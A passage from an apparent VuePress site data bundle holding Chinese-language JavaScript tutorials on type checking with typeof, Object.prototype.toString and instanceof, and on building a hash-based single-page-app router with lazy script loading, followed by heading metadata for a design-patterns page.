=== \"[object \"+type+\"]\"){\n        return true;\n    }\n    return false;\n}\n\nfunction isNumber(data){\n    return isType(data,'Number');\n}\nfunction isBoolean(data){\n    return isType(data,'Boolean');\n}\nfunction isString(data){\n    return isType(data,'String');\n}\nfunction isUndefined(data){\n    return isType(data,'Undefined');\n}\nfunction isNull(data){\n    return isType(data,'Null');\n}\nfunction isSymbol(data){\n    return isType(data,'Symbol');\n}\nfunction isArray(data){\n    return isType(data,'Array');\n}\nfunction isFunction(data){\n    return isType(data,'Function');\n}\nfunction isObject(data){\n    return isType(data,'Object');\n}\nfunction isDate(data){\n    return isType(data,'Date');\n}\nfunction isRegExp(data){\n    return isType(data,'RegExp');\n}\n\n\n\n# 根据对象的constructor判断\n\n在JavaScript中一切皆对象，每个对象都是某个构造函数的实例，因此具有constructor数据指向其构造函数，我们可以基于该特性来判断数据类型：\n\nvar num = 100;\nnum.constructor == Number   // Number 是数值构造函数\n\nfunction isType(data,fn){\n    return data.constructor === fn\n}\n\nisType(num,Number)     // true\nisType('hello',String) // true\nisType(true,Boolean)   // true\nisType([],Array)       // true\n\n\n\n# instanceof 运算符\n\n在 JavaScript 中，判断一个变量的类型常常会用 typeof 运算符，在使用 typeof 运算符时采用引用类型存储值会出现一个问题，无论引用的是什么类型的对象，它都返回 \"object\"。ECMAScript 引入了另一个 Java 运算符 instanceof 来解决这个问题。instanceof 运算符与 typeof 运算符相似，用于识别正在处理的对象的类型。\n\n# instanceof 运算符的常规用法\n\n使用 instanceof 就是判断一个对象是否是某个构造函数的实例。例如：\n\n// 判断 foo 是否是 Foo 类的实例\nfunction Foo(){}\nvar foo = new Foo();\nconsole.log(foo instanceof Foo)//true\n\n\n# instanceof 在继承中关系中的用法\n\ninstanceof 可以在继承关系中用来判断一个实例是否属于它的父构造函数。例如：\n\n// 判断 foo 是否是 Foo 类的实例 , 并且是否是其父类型的实例\nfunction Aoo(){}\nfunction Foo(){}\nFoo.prototype = new Aoo();//JavaScript 原型继承\n\nvar foo = new Foo();\nconsole.log(foo instanceof Foo)//true\nconsole.log(foo instanceof Aoo)//true\n\n\n> 上面的代码中是判断了一层继承关系中的父类，在多层继承关系中，instanceof 运算符同样适用。\n\n# 直接量不能使用instanceof\n\nvar a=1;\n\na instanceof Number;\n\n//false\n\nvar b=\"123\";\n\nb instanceof String;\n\n//false\n\n\n直接量不能使用instanceof的。\n\ninstanceof的用途是判断一个对象是否在某个对象原型链上。或者说判断一个对象是某个构造函数的实例。",normalizedContent:"# 数据类型检测\n\n\n# 操作符 typeof\n\n\n# 语法\n\ntypeof运算符后跟操作数：\n\ntypeof operand\n// or\ntypeof (operand)\n\n\n\n# 返回值\n\n下表总结了typeof可能的返回值\n\n类型          结果\nundefined   \"undefined\"\nnull        \"object\"\nboolean     \"boolean\"\nnumber      \"number\"\nbigint      \"bigint\"\nstring      \"string\"\nsymbol      \"symbol\"\n函数          \"function\"\n任何其他对象      \"object\"\n\n\n# 示例\n\n// boolean\ntypeof true === 'boolean'\ntypeof false === 'boolean'\n// undefined\ntypeof undefined ==='undefined'\n// number\ntypeof 37 === 'number';\ntypeof nan === 'number';\ntypeof math.pi === 'number';\n// bigint\ntypeof 1n ==='bigint'\n// string\ntypeof \"\" === 'string';\ntypeof \"bla\" === 'string';\ntypeof (typeof 1) === 'string'; // typeof总是返回一个字符串\n// object\ntypeof {a:1} === 'object';\ntypeof [1, 2, 4] === 'object';\ntypeof null === 'object';    //特殊值null被认为是一个空的对象引用\n\n\ntip\n\n严格来讲，函数在 ecmascript 中被认为是对象，并不代表一种数据类型。可是，函数也有自己特殊的属性。为此，就有必要通过 typeof 操作符来区分函数和其他对象。\n\n\n# prototype\n\n\n# 语法\n\nobject.prototype.tostring.call(x)   //[object x]\n\n\n\n# 示例\n\nconsole.log(object.prototype.tostring.call(new date()))     // [object date]\nconsole.log(object.prototype.tostring.call(null)            // [object null]\nconsole.log(object.prototype.tostring.call(new array()))    // [object array]\nconsole.log(object.prototype.tostring.call('dd'))           // [object string]\nconsole.log(object.prototype.tostring.call(undefined))      // [object undefined]\nconsole.log(object.prototype.tostring.call(symbol('d')))    // [object symbol]\nconsole.log(object.prototype.tostring.call(function))       // [object function]\nconsole.log(object.prototype.tostring.call(1n))             // [object bigint]\n\n\n\n这种方法能够很好的检测出各种类型。\n\nfunction istype(data,type){\n    if(object.prototype.tostring.call(data) === \"[object \"+type+\"]\"){\n        return true;\n    }\n    return false;\n}\n\nfunction isnumber(data){\n    return istype(data,'number');\n}\nfunction isboolean(data){\n    return istype(data,'boolean');\n}\nfunction isstring(data){\n    return istype(data,'string');\n}\nfunction isundefined(data){\n    return istype(data,'undefined');\n}\nfunction isnull(data){\n    return istype(data,'null');\n}\nfunction issymbol(data){\n    return istype(data,'symbol');\n}\nfunction isarray(data){\n    return istype(data,'array');\n}\nfunction isfunction(data){\n    return istype(data,'function');\n}\nfunction isobject(data){\n    return istype(data,'object');\n}\nfunction isdate(data){\n    return istype(data,'date');\n}\nfunction isregexp(data){\n    return istype(data,'regexp');\n}\n\n\n\n# 根据对象的constructor判断\n\n在javascript中一切皆对象，每个对象都是某个构造函数的实例，因此具有constructor数据指向其构造函数，我们可以基于该特性来判断数据类型：\n\nvar num = 100;\nnum.constructor == number   // number 是数值构造函数\n\nfunction istype(data,fn){\n    return data.constructor === fn\n}\n\nistype(num,number)     // true\nistype('hello',string) // true\nistype(true,boolean)   // true\nistype([],array)       // true\n\n\n\n# instanceof 运算符\n\n在 javascript 中，判断一个变量的类型常常会用 typeof 运算符，在使用 typeof 运算符时采用引用类型存储值会出现一个问题，无论引用的是什么类型的对象，它都返回 \"object\"。ecmascript 引入了另一个 java 运算符 instanceof 来解决这个问题。instanceof 运算符与 typeof 运算符相似，用于识别正在处理的对象的类型。\n\n# instanceof 运算符的常规用法\n\n使用 instanceof 就是判断一个对象是否是某个构造函数的实例。例如：\n\n// 判断 foo 是否是 foo 类的实例\nfunction foo(){}\nvar foo = new foo();\nconsole.log(foo instanceof foo)//true\n\n\n# instanceof 在继承中关系中的用法\n\ninstanceof 可以在继承关系中用来判断一个实例是否属于它的父构造函数。例如：\n\n// 判断 foo 是否是 foo 类的实例 , 并且是否是其父类型的实例\nfunction aoo(){}\nfunction foo(){}\nfoo.prototype = new aoo();//javascript 原型继承\n\nvar foo = new foo();\nconsole.log(foo instanceof foo)//true\nconsole.log(foo instanceof aoo)//true\n\n\n> 上面的代码中是判断了一层继承关系中的父类，在多层继承关系中，instanceof 运算符同样适用。\n\n# 直接量不能使用instanceof\n\nvar a=1;\n\na instanceof number;\n\n//false\n\nvar b=\"123\";\n\nb instanceof string;\n\n//false\n\n\n直接量不能使用instanceof的。\n\ninstanceof的用途是判断一个对象是否在某个对象原型链上。或者说判断一个对象是某个构造函数的实例。",charsets:{cjk:!0}},{title:"SPA",frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/SPA.html",relativePath:"Javascript/Javascript扩展操作/SPA.md",key:"v-50bee77e",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/SPA.html",headers:[{level:2,title:"前端路由",slug:"前端路由",normalizedTitle:"前端路由",charIndex:108},{level:3,title:"Hash 模式",slug:"hash-模式",normalizedTitle:"hash 模式",charIndex:475},{level:3,title:"History 模式",slug:"history-模式",normalizedTitle:"history 模式",charIndex:831},{level:2,title:"实现Hash路由模式步骤",slug:"实现hash路由模式步骤",normalizedTitle:"实现hash路由模式步骤",charIndex:1218},{level:2,title:"完整",slug:"完整",normalizedTitle:"完整",charIndex:3313}],headersStr:"前端路由 Hash 模式 History 模式 实现Hash路由模式步骤 完整",content:"# SPA\n\n单页Web应用（single page web application，SPA），就是只有一张Web页面的应用，是加载单个HTML 页面并在用户与应用程序交互时动态更新该页面的Web应用程序。\n\n\n# 前端路由\n\n随着 ajax 的流行，异步数据请求交互运行在不刷新浏览器的情况下进行。而异步交互体验的更高级版本就是 SPA —— 单页应用。单页应用不仅仅是在页面交互是无刷新的，连页面跳转都是无刷新的，为了实现单页应用，所以就有了前端路由。 类似于服务端路由，前端路由实现起来其实也很简单，就是匹配不同的 url 路径，进行解析，然后动态的渲染出区域 html 内容。但是这样存在一个问题，就是 url 每次变化的时候，都会造成页面的刷新。那解决问题的思路便是在改变 url 的情况下，保证页面的不刷新。\n\n“更新视图但不重新请求页面”是前端路由原理的核心之一，目前在浏览器环境中这一功能的实现主要有两种方式：\n\n * 利用URL中的hash（\"#\"）\n * 利用History interface在 HTML5中新增的方法\n\n\n# Hash 模式\n\n在 2014 年之前，大家是通过 hash 来实现路由,url hash 就是类似于：\n\nhttp://www.xxx.com/#/login\n\n\n这种 #。后面 hash 值的变化，并不会导致浏览器向服务器发出请求，浏览器不发出请求，也就不会刷新页面。另外每次 hash 值的变化，还会触发hashchange 这个事件，通过这个事件我们就可以知道 hash 值发生了哪些变化。然后我们便可以监听hashchange来实现更新页面部分内容的操作：\n\nfunction matchAndUpdate () {\n   // todo 匹配 hash 做 dom 更新操作\n}\n\nwindow.addEventListener('hashchange', matchAndUpdate)\n\n\n\n# History 模式\n\n14年后，因为HTML5标准发布。多了两个 API，pushState 和 replaceState，通过这两个 API 可以改变 url 地址且不会发送请求。同时还有popstate 事件。通过这些就能用另一种方式来实现前端路由了，但原理都是跟 hash 实现相同的。用了 HTML5 的实现，单页路由的 url 就不会多出一个#，变得更加美观。但因为没有 # 号，所以当用户刷新页面之类的操作时，浏览器还是会给服务器发送请求。为了避免出现这种情况，所以这个实现需要服务器的支持，需要把所有路由都重定向到根页面。\n\nfunction matchAndUpdate () {\n   // todo 匹配路径 做 dom 更新操作\n}\n\nwindow.addEventListener('popstate', matchAndUpdate)\n\n\n\n# 实现Hash路由模式步骤\n\n 1. 切换页面：路由的最大作用就是切换页面，以往后台的路由是直接改变了页面的url方式促使页面刷新。但是前端路由通过 # 号不能刷新页面，只能通过 window 的监听事件 hashchange 来监听hash的变化，然后捕获到具体的hash值进行操作\n\n//路由切换\nwindow.addEventListener('hashchange',function(){\n    //do something\n    this.hashChange()\n})\n\n\n 2. 注册路由：我们需要把路由规则注册到页面，这样页面在切换的时候才会有不同的效果。\n\n//注册函数\n map:function(path,callback){\n   path = path.replace(/\\s*/g,\"\");//过滤空格\n   //在有回调，且回调是一个正确的函数的情况下进行存储 以 /name 为key的对象 {callback:xx}\n   if(callback && Object.prototype.toString.call(callback) === '[object Function]' ){\n       this.routers[path] ={\n            callback:callback,//回调\n            fn:null //存储异步文件状态，用来记录异步的js文件是否下载，下文有提及\n        }\n    }else{\n    //打印出错的堆栈信息\n        console.trace('注册'+path+'地址需要提供正确的的注册回调')\n    }\n }\n //调用方式\n map('/detail',function(transition){\n})\n\n\n 3. 异步加载js：一般单页面应用为了性能优化，都会把各个页面的文件拆分开，按需加载，所以路由里面要加入异步加载js文件的功能。异步加载我们就采用最简单的原生方法，创建script标签，动态引入js。\n\nvar _body= document.getElementsByTagName('body')[0],\n    scriptEle= document.createElement('script');\nscriptEle.type= 'text/javascript';\nscriptEle.src= xxx.js;\nscriptEle.async = true;\nscriptEle.onload= function(callback){\n    //为了避免重复引入js，我们需要在这里记录一下已经加载过的文件，对应的 fn需要赋值处理\n    callback()\n}\n_body.appendChild(scriptEle);   \n\n\n 4. 参数传递：在我们动态引入单独模块的js之后，我们可能需要给这个模块传递一些单独的参数。这里借鉴了一下jsonp的处理方式，我们把单独模块的js包装成一个函数，提供一个全局的回调方法，加载完成时候再调用回调函数。\n\nSPA_RESOLVE_INIT = function(transition) {\n    document.getElementById(\"content\").innerHTML = '<p style=\"color:#F8C545;\">当前异步渲染列表页'+ JSON.stringify(transition) +'</p>'\n    console.log(\"首页回调\" + JSON.stringify(transition))\n}\n\n\n 5. 以上我们已经完成了基本功能，我们再对齐进行扩展，在页面切换之前beforeEach和切换完成afterEach的时候增加2个方法进行处理。思路是，注册了这2个方法之后，在切换之前就调用beforeEach，切换之后，需要等待下载js完成，在onload里面进行调用 afterEach\n\n//切换之前一些处理\nbeforeEach:function(callback){\n   if(Object.prototype.toString.call(callback) === '[object Function]'){\n       this.beforeFun = callback;\n   }else{\n       console.trace('路由切换前钩子函数不正确')\n   }\n},\n//切换成功之后\nafterEach:function(callback){\n   if(Object.prototype.toString.call(callback) === '[object Function]'){\n       this.afterFun = callback;\n   }else{\n       console.trace('路由切换后回调函数不正确')\n   }\n}\n\n\n\n# 完整\n\n/*\n**使用方法\n*       1：注册路由 : spaRouters.map('/name',function(transition){\n                        //异步加载js\n                        spaRouters.asyncFun('name.js',transition)\n                        //或者同步执行回调\n                        spaRouters.syncFun(function(transition){},transition)\n                    })\n        2：初始化      spaRouters.init()\n        3：跳转  href = '#/name'           \n*/\nvar util = {\n    //获取路由的路径和详细参数\n    getParamsUrl:function(){\n        var hashDeatail = location.hash.split(\"?\"),\n            hashName = hashDeatail[0].split(\"#\")[1],//路由地址\n            params = hashDeatail[1] ? hashDeatail[1].split(\"&\") : [],//参数内容\n            query = {};\n        for(var i = 0;i<params.length ; i++){\n            var item = params[i].split(\"=\");\n            query[item[0]] = item[1]\n        }       \n        return  {\n            path:hashName,\n            query:query\n        }\n    }\n}\nfunction spaRouters(){\n    this.routers = {};//保存注册的所有路由\n    this.beforeFun = null;//切换前\n    this.afterFun = null;\n}\nspaRouters.prototype={\n    init:function(){\n        var self = this;\n        //页面加载匹配路由\n        window.addEventListener('load',function(){\n            self.urlChange()\n        })\n        //路由切换\n        window.addEventListener('hashchange',function(){\n            self.urlChange()\n        })\n        //异步引入js通过回调传递参数\n        window.SPA_RESOLVE_INIT = null;\n    },\n    refresh:function(currentHash){\n        var self = this;\n        if(self.beforeFun){\n            self.beforeFun({\n                to:{\n                    path:currentHash.path,\n                    query:currentHash.query\n                },\n                next:function(){\n                    self.routers[currentHash.path].callback.call(self,currentHash)\n                }\n            })\n        }else{\n            self.routers[currentHash.path].callback.call(self,currentHash)\n        }\n    },\n    //路由处理\n    urlChange:function(){\n        var currentHash = util.getParamsUrl();\n        if(this.routers[currentHash.path]){\n            this.refresh(currentHash)\n        }else{\n            //不存在的地址重定向到首页\n            location.hash = '/index'\n        }\n    },\n    //单层路由注册\n    map:function(path,callback){\n        path = path.replace(/\\s*/g,\"\");//过滤空格\n        if(callback && Object.prototype.toString.call(callback) === '[object Function]' ){\n            this.routers[path] ={\n                callback:callback,//回调\n                fn:null //存储异步文件状态\n            }\n        }else{\n            console.trace('注册'+path+'地址需要提供正确的的注册回调')\n        }\n    },\n    //切换之前一些处理\n    beforeEach:function(callback){\n        if(Object.prototype.toString.call(callback) === '[object Function]'){\n            this.beforeFun = callback;\n        }else{\n            console.trace('路由切换前钩子函数不正确')\n        }\n    },\n    //切换成功之后\n    afterEach:function(callback){\n        if(Object.prototype.toString.call(callback) === '[object Function]'){\n            this.afterFun = callback;\n        }else{\n            console.trace('路由切换后回调函数不正确')\n        }\n    },\n    //路由异步懒加载js文件\n    asyncFun:function(file,transition){\n       var self = this;\n       if(self.routers[transition.path].fn){\n            self.afterFun && self.afterFun(transition)  \n            self.routers[transition.path].fn(transition)\n       }else{\n           console.log(\"开始异步下载js文件\"+file)\n           var _body= document.getElementsByTagName('body')[0];\n           var scriptEle= document.createElement('script');\n           scriptEle.type= 'text/javascript';\n           scriptEle.src= file;\n           scriptEle.async = true;\n           SPA_RESOLVE_INIT = null;\n           scriptEle.onload= function(){\n               console.log('下载'+file+'完成')\n               self.afterFun && self.afterFun(transition)   \n               self.routers[transition.path].fn = SPA_RESOLVE_INIT;\n               self.routers[transition.path].fn(transition)\n           }\n           _body.appendChild(scriptEle);        \n       }        \n    },\n    //同步操作\n    syncFun:function(callback,transition){\n        this.afterFun && this.afterFun(transition)\n        callback &&　callback(transition)\n    }\n}\n//注册到window全局\nwindow.spaRouters = new spaRouters();\n",normalizedContent:"# spa\n\n单页web应用（single page web application，spa），就是只有一张web页面的应用，是加载单个html 页面并在用户与应用程序交互时动态更新该页面的web应用程序。\n\n\n# 前端路由\n\n随着 ajax 的流行，异步数据请求交互运行在不刷新浏览器的情况下进行。而异步交互体验的更高级版本就是 spa —— 单页应用。单页应用不仅仅是在页面交互是无刷新的，连页面跳转都是无刷新的，为了实现单页应用，所以就有了前端路由。 类似于服务端路由，前端路由实现起来其实也很简单，就是匹配不同的 url 路径，进行解析，然后动态的渲染出区域 html 内容。但是这样存在一个问题，就是 url 每次变化的时候，都会造成页面的刷新。那解决问题的思路便是在改变 url 的情况下，保证页面的不刷新。\n\n“更新视图但不重新请求页面”是前端路由原理的核心之一，目前在浏览器环境中这一功能的实现主要有两种方式：\n\n * 利用url中的hash（\"#\"）\n * 利用history interface在 html5中新增的方法\n\n\n# hash 模式\n\n在 2014 年之前，大家是通过 hash 来实现路由,url hash 就是类似于：\n\nhttp://www.xxx.com/#/login\n\n\n这种 #。后面 hash 值的变化，并不会导致浏览器向服务器发出请求，浏览器不发出请求，也就不会刷新页面。另外每次 hash 值的变化，还会触发hashchange 这个事件，通过这个事件我们就可以知道 hash 值发生了哪些变化。然后我们便可以监听hashchange来实现更新页面部分内容的操作：\n\nfunction matchandupdate () {\n   // todo 匹配 hash 做 dom 更新操作\n}\n\nwindow.addeventlistener('hashchange', matchandupdate)\n\n\n\n# history 模式\n\n14年后，因为html5标准发布。多了两个 api，pushstate 和 replacestate，通过这两个 api 可以改变 url 地址且不会发送请求。同时还有popstate 事件。通过这些就能用另一种方式来实现前端路由了，但原理都是跟 hash 实现相同的。用了 html5 的实现，单页路由的 url 就不会多出一个#，变得更加美观。但因为没有 # 号，所以当用户刷新页面之类的操作时，浏览器还是会给服务器发送请求。为了避免出现这种情况，所以这个实现需要服务器的支持，需要把所有路由都重定向到根页面。\n\nfunction matchandupdate () {\n   // todo 匹配路径 做 dom 更新操作\n}\n\nwindow.addeventlistener('popstate', matchandupdate)\n\n\n\n# 实现hash路由模式步骤\n\n 1. 切换页面：路由的最大作用就是切换页面，以往后台的路由是直接改变了页面的url方式促使页面刷新。但是前端路由通过 # 号不能刷新页面，只能通过 window 的监听事件 hashchange 来监听hash的变化，然后捕获到具体的hash值进行操作\n\n//路由切换\nwindow.addeventlistener('hashchange',function(){\n    //do something\n    this.hashchange()\n})\n\n\n 2. 注册路由：我们需要把路由规则注册到页面，这样页面在切换的时候才会有不同的效果。\n\n//注册函数\n map:function(path,callback){\n   path = path.replace(/\\s*/g,\"\");//过滤空格\n   //在有回调，且回调是一个正确的函数的情况下进行存储 以 /name 为key的对象 {callback:xx}\n   if(callback && object.prototype.tostring.call(callback) === '[object function]' ){\n       this.routers[path] ={\n            callback:callback,//回调\n            fn:null //存储异步文件状态，用来记录异步的js文件是否下载，下文有提及\n        }\n    }else{\n    //打印出错的堆栈信息\n        console.trace('注册'+path+'地址需要提供正确的的注册回调')\n    }\n }\n //调用方式\n map('/detail',function(transition){\n})\n\n\n 3. 异步加载js：一般单页面应用为了性能优化，都会把各个页面的文件拆分开，按需加载，所以路由里面要加入异步加载js文件的功能。异步加载我们就采用最简单的原生方法，创建script标签，动态引入js。\n\nvar _body= document.getelementsbytagname('body')[0],\n    scriptele= document.createelement('script');\nscriptele.type= 'text/javascript';\nscriptele.src= xxx.js;\nscriptele.async = true;\nscriptele.onload= function(callback){\n    //为了避免重复引入js，我们需要在这里记录一下已经加载过的文件，对应的 fn需要赋值处理\n    callback()\n}\n_body.appendchild(scriptele);   \n\n\n 4. 参数传递：在我们动态引入单独模块的js之后，我们可能需要给这个模块传递一些单独的参数。这里借鉴了一下jsonp的处理方式，我们把单独模块的js包装成一个函数，提供一个全局的回调方法，加载完成时候再调用回调函数。\n\nspa_resolve_init = function(transition) {\n    document.getelementbyid(\"content\").innerhtml = '<p style=\"color:#f8c545;\">当前异步渲染列表页'+ json.stringify(transition) +'</p>'\n    console.log(\"首页回调\" + json.stringify(transition))\n}\n\n\n 5. 以上我们已经完成了基本功能，我们再对齐进行扩展，在页面切换之前beforeeach和切换完成aftereach的时候增加2个方法进行处理。思路是，注册了这2个方法之后，在切换之前就调用beforeeach，切换之后，需要等待下载js完成，在onload里面进行调用 aftereach\n\n//切换之前一些处理\nbeforeeach:function(callback){\n   if(object.prototype.tostring.call(callback) === '[object function]'){\n       this.beforefun = callback;\n   }else{\n       console.trace('路由切换前钩子函数不正确')\n   }\n},\n//切换成功之后\naftereach:function(callback){\n   if(object.prototype.tostring.call(callback) === '[object function]'){\n       this.afterfun = callback;\n   }else{\n       console.trace('路由切换后回调函数不正确')\n   }\n}\n\n\n\n# 完整\n\n/*\n**使用方法\n*       1：注册路由 : sparouters.map('/name',function(transition){\n                        //异步加载js\n                        sparouters.asyncfun('name.js',transition)\n                        //或者同步执行回调\n                        sparouters.syncfun(function(transition){},transition)\n                    })\n        2：初始化      sparouters.init()\n        3：跳转  href = '#/name'           \n*/\nvar util = {\n    //获取路由的路径和详细参数\n    getparamsurl:function(){\n        var hashdeatail = location.hash.split(\"?\"),\n            hashname = hashdeatail[0].split(\"#\")[1],//路由地址\n            params = hashdeatail[1] ? hashdeatail[1].split(\"&\") : [],//参数内容\n            query = {};\n        for(var i = 0;i<params.length ; i++){\n            var item = params[i].split(\"=\");\n            query[item[0]] = item[1]\n        }       \n        return  {\n            path:hashname,\n            query:query\n        }\n    }\n}\nfunction sparouters(){\n    this.routers = {};//保存注册的所有路由\n    this.beforefun = null;//切换前\n    this.afterfun = null;\n}\nsparouters.prototype={\n    init:function(){\n        var self = this;\n        //页面加载匹配路由\n        window.addeventlistener('load',function(){\n            self.urlchange()\n        })\n        //路由切换\n        window.addeventlistener('hashchange',function(){\n            self.urlchange()\n        })\n        //异步引入js通过回调传递参数\n        window.spa_resolve_init = null;\n    },\n    refresh:function(currenthash){\n        var self = this;\n        if(self.beforefun){\n            self.beforefun({\n                to:{\n                    path:currenthash.path,\n                    query:currenthash.query\n                },\n                next:function(){\n                    self.routers[currenthash.path].callback.call(self,currenthash)\n                }\n            })\n        }else{\n            self.routers[currenthash.path].callback.call(self,currenthash)\n        }\n    },\n    //路由处理\n    urlchange:function(){\n        var currenthash = util.getparamsurl();\n        if(this.routers[currenthash.path]){\n            this.refresh(currenthash)\n        }else{\n            //不存在的地址重定向到首页\n            location.hash = '/index'\n        }\n    },\n    //单层路由注册\n    map:function(path,callback){\n        path = path.replace(/\\s*/g,\"\");//过滤空格\n        if(callback && object.prototype.tostring.call(callback) === '[object function]' ){\n            this.routers[path] ={\n                callback:callback,//回调\n                fn:null //存储异步文件状态\n            }\n        }else{\n            console.trace('注册'+path+'地址需要提供正确的的注册回调')\n        }\n    },\n    //切换之前一些处理\n    beforeeach:function(callback){\n        if(object.prototype.tostring.call(callback) === '[object function]'){\n            this.beforefun = callback;\n        }else{\n            console.trace('路由切换前钩子函数不正确')\n        }\n    },\n    //切换成功之后\n    aftereach:function(callback){\n        if(object.prototype.tostring.call(callback) === '[object function]'){\n            this.afterfun = callback;\n        }else{\n            console.trace('路由切换后回调函数不正确')\n        }\n    },\n    //路由异步懒加载js文件\n    asyncfun:function(file,transition){\n       var self = this;\n       if(self.routers[transition.path].fn){\n            self.afterfun && self.afterfun(transition)  \n            self.routers[transition.path].fn(transition)\n       }else{\n           console.log(\"开始异步下载js文件\"+file)\n           var _body= document.getelementsbytagname('body')[0];\n           var scriptele= document.createelement('script');\n           scriptele.type= 'text/javascript';\n           scriptele.src= file;\n           scriptele.async = true;\n           spa_resolve_init = null;\n           scriptele.onload= function(){\n               console.log('下载'+file+'完成')\n               self.afterfun && self.afterfun(transition)   \n               self.routers[transition.path].fn = spa_resolve_init;\n               self.routers[transition.path].fn(transition)\n           }\n           _body.appendchild(scriptele);        \n       }        \n    },\n    //同步操作\n    syncfun:function(callback,transition){\n        this.afterfun && this.afterfun(transition)\n        callback &&　callback(transition)\n    }\n}\n//注册到window全局\nwindow.sparouters = new sparouters();\n",charsets:{cjk:!0}},{title:"JavaScript设计模式",frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html",relativePath:"Javascript/Javascript扩展操作/JavaScript设计模式.md",key:"v-340241d1",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html",headers:[{level:2,title:"什么是设计模式?",slug:"什么是设计模式",normalizedTitle:"什么是设计模式?",charIndex:21},{level:2,title:"为什么使用设计模式",slug:"为什么使用设计模式",normalizedTitle:"为什么使用设计模式",charIndex:204},{level:2,title:"设计模式的六大原则",slug:"设计模式的六大原则",normalizedTitle:"设计模式的六大原则",charIndex:271},{level:2,title:"单体模式(单例模式)",slug:"单体模式-单例模式",normalizedTitle:"单体模式(单例模式)",charIndex:1286},{level:3,title:"简单案例",slug:"简单案例",normalizedTitle:"简单案例",charIndex:1427},{level:3,title:"适用场合",slug:"适用场合",normalizedTitle:"适用场合",charIndex:2023},{level:2,title:"工厂模式",slug:"工厂模式",normalizedTitle:"工厂模式",charIndex:2207},{level:3,title:"简单工程模式",slug:"简单工程模式",normalizedTitle:"简单工程模式",charIndex:2316},{level:3,title:"工厂方法模式",slug:"工厂方法模式",normalizedTitle:"工厂方法模式",charIndex:2298},{level:3,title:"抽象工厂模式",slug:"抽象工厂模式",normalizedTitle:"抽象工厂模式",charIndex:2305},{level:3,title:"使用场合",slug:"使用场合",normalizedTitle:"使用场合",charIndex:6190},{level:2,title:"迭代器模式",slug:"迭代器模式",normalizedTitle:"迭代器模式",charIndex:6352},{level:3,title:"内部迭代器",slug:"内部迭代器",normalizedTitle:"内部迭代器",charIndex:6458},{level:3,title:"外部迭代器",slug:"外部迭代器",normalizedTitle:"外部迭代器",charIndex:6849},{level:3,title:"倒序迭代器",slug:"倒序迭代器",normalizedTitle:"倒序迭代器",charIndex:7766},{level:3,title:"中止迭代器",slug:"中止迭代器",normalizedTitle:"中止迭代器",charIndex:7989},{level:3,title:"使用场合",slug:"使用场合-2",normalizedTitle:"使用场合",charIndex:6190},{level:2,title:"命令模式",slug:"命令模式",normalizedTitle:"命令模式",charIndex:8174},{level:3,title:"适用场景",slug:"适用场景",normalizedTitle:"适用场景",charIndex:8237},{level:3,title:"简单案例",slug:"简单案例-2",normalizedTitle:"简单案例",charIndex:1427},{level:2,title:"组合模式",slug:"组合模式",normalizedTitle:"组合模式",charIndex:9918},{level:3,title:"经典案例",slug:"经典案例",normalizedTitle:"经典案例",charIndex:10099},{level:3,title:"使用场景",slug:"使用场景",normalizedTitle:"使用场景",charIndex:11033},{level:3,title:"缺点",slug:"缺点",normalizedTitle:"缺点",charIndex:11285},{level:2,title:"模板方法模式",slug:"模板方法模式",normalizedTitle:"模板方法模式",charIndex:11413},{level:3,title:"组成部分",slug:"组成部分",normalizedTitle:"组成部分",charIndex:11457},{level:3,title:"使用场景例子",slug:"使用场景例子",normalizedTitle:"使用场景例子",charIndex:11573},{level:3,title:"好莱坞原则",slug:"好莱坞原则",normalizedTitle:"好莱坞原则",charIndex:11901},{level:3,title:"除此之外，好莱坞原则还常常应用于其他模式和场景，例如发布订阅模式和回调函数。",slug:"除此之外-好莱坞原则还常常应用于其他模式和场景-例如发布订阅模式和回调函数。",normalizedTitle:"除此之外，好莱坞原则还常常应用于其他模式和场景，例如发布订阅模式和回调函数。",charIndex:12033},{level:3,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:12340},{level:2,title:"享元模式",slug:"享元模式",normalizedTitle:"享元模式",charIndex:12562},{level:3,title:"内部状态与外部状态",slug:"内部状态与外部状态",normalizedTitle:"内部状态与外部状态",charIndex:12654},{level:3,title:"区分内部状态与外部状态",slug:"区分内部状态与外部状态",normalizedTitle:"区分内部状态与外部状态",charIndex:13027},{level:3,title:"例子（享元模式文件上传）",slug:"例子-享元模式文件上传",normalizedTitle:"例子（享元模式文件上传）",charIndex:13116},{level:3,title:"享元模式的适用性",slug:"享元模式的适用性",normalizedTitle:"享元模式的适用性",charIndex:15285},{level:3,title:"对象池",slug:"对象池",normalizedTitle:"对象池",charIndex:15478},{level:3,title:"小结",slug:"小结",normalizedTitle:"小结",charIndex:15593},{level:2,title:"职责链模式",slug:"职责链模式",normalizedTitle:"职责链模式",charIndex:15677},{level:3,title:"现实中的职责链模式",slug:"现实中的职责链模式",normalizedTitle:"现实中的职责链模式",charIndex:15763},{level:3,title:"开发中的职责链模式",slug:"开发中的职责链模式",normalizedTitle:"开发中的职责链模式",charIndex:16024},{level:3,title:"异步的职责链",slug:"异步的职责链",normalizedTitle:"异步的职责链",charIndex:19170},{level:3,title:"用 AOP 实现职责链",slug:"用-aop-实现职责链",normalizedTitle:"用 aop 